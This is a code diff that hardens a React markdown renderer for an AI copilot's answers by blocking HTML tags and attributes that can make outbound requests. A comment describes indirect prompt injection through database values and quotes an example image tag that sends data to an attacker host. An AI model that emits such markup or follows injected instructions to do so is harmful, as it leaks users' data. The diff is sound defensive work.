@@ -10,6 +10,45 @@ export interface CodeProps {
   lang: string
 }
 
+/**
+ * Copilot answers are plain markdown (text, tables, code, links). They never
+ * contain images or embedded media. Because message content can be influenced
+ * by untrusted data (e.g. indirect prompt injection via values stored in the
+ * database), we block every tag able to trigger an outbound request on render
+ * — otherwise a crafted `<img src="https://attacker/?data=...">` would silently
+ * exfiltrate data as soon as the browser loads it. See RED-194228 / VDP-4596.
+ */
+const BLACKLISTED_TAGS = [
+  'iframe',
+  'script',
+  'img',
+  'image',
+  'picture',
+  'source',
+  'video',
+  'audio',
+  'track',
+  'object',
+  'embed',
+  'style',
+  'svg',
+  'input',
+]
+
+// Strip event handlers (default) plus attributes that can trigger an outbound
+// request on render: `style` (CSS `background-image: url(...)`) and the legacy
+// `background` image URL supported on `<table>`/`<td>` in some browsers.
+const BLACKLISTED_ATTRS: Array<string | RegExp> = [
+  /^on.+/i,
+  /^style$/i,
+  /^background$/i,
+]
+
+// Note: raw HTML `<link>` elements never reach the parser — `remarkSanitize`
+// (DOMPurify) strips them during formatting. We must NOT blacklist the `link`
+// tag here: JsxParser's blacklistedTags is case-insensitive, so it would also
+// drop the legitimate PascalCase <Link> component emitted by the formatter.
+
 export interface Props {
   onRunCommand?: (query: string) => void
   modules?: AdditionalRedisModule[]
@@ -65,7 +104,8 @@ const MarkdownMessage = (props: Props) => {
     // @ts-ignore
     <JsxParser
       components={components}
-      blacklistedTags={['iframe', 'script']}
+      blacklistedTags={BLACKLISTED_TAGS}
+      blacklistedAttrs={BLACKLISTED_ATTRS}
       autoCloseVoidElements
       jsx={content}
       onError={() => setParseAsIs(true)}
